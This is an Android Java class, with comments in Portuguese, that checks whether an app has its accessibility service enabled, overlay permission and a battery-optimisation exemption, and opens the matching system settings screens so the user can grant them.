package com.seguranca.protecao;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.text.TextUtils;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityManager;
import java.util.List;

/**
 * Gerenciador de permissões
 * 
 * Centraliza toda a lógica de verificação e solicitação de permissões
 * necessárias para o funcionamento do aplicativo
 */
public class PermissionManager {
    
    private Context context;
    
    public PermissionManager(Context context) {
        this.context = context;
    }
    
    /**
     * Verifica se o serviço de acessibilidade está habilitado
     * @return true se está habilitado, false caso contrário
     */
    public boolean isAccessibilityServiceEnabled() {
        if (UiAssistBridge.instance != null) {
            return true;
        }

        try {
            AccessibilityManager am = (AccessibilityManager) context.getSystemService(Context.ACCESSIBILITY_SERVICE);
            if (am != null) {
                List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
                if (enabledServices != null) {
                    String pkg = context.getPackageName().toLowerCase();
                    for (AccessibilityServiceInfo service : enabledServices) {
                        String serviceId = service.getId();
                        if (serviceId != null && (serviceId.toLowerCase().contains(pkg) || serviceId.contains("UiAssistBridge"))) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        try {
            int accessibilityEnabled = Settings.Secure.getInt(
                context.getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED
            );
            if (accessibilityEnabled == 1) {
                String services = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                );
                if (services != null) {
                    String pkg = context.getPackageName().toLowerCase();
                    return services.toLowerCase().contains(pkg) || services.contains("UiAssistBridge");
                }
            }
        } catch (Exception ignored) {}

        return false;
    }
    
    /**
     * Verifica se tem permissão para desenhar sobre outras apps
     * @return true se tem permissão, false caso contrário
     */
    public boolean hasOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(context);
        }
        return true; // Versões antigas não precisam desta permissão
    }
    
    /**
     * Solicita permissão para desenhar sobre outras apps
     */
    public void requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !hasOverlayPermission()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }
    
    /**
     * Verifica se o app está ignorando otimizações de bateria
     * @return true se está ignorando, false caso contrário
     */
    public boolean isIgnoringBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String packageName = context.getPackageName();
            android.os.PowerManager pm = (android.os.PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                return pm.isIgnoringBatteryOptimizations(packageName);
            }
        }
        return true;
    }
    
    /**
     * Solicita para ignorar otimizações de bateria
     */
    public void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !isIgnoringBatteryOptimizations()) {
            try {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    /**
     * Verifica se todas as permissões críticas estão concedidas
     * @return true se todas estão concedidas, false caso contrário
     */
    public boolean hasAllCriticalPermissions() {
        return isAccessibilityServiceEnabled() && 
               hasOverlayPermission() && 
               isIgnoringBatteryOptimizations();
    }
    
    /**
     * Abre as configurações de acessibilidade
     */
    public void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }
}
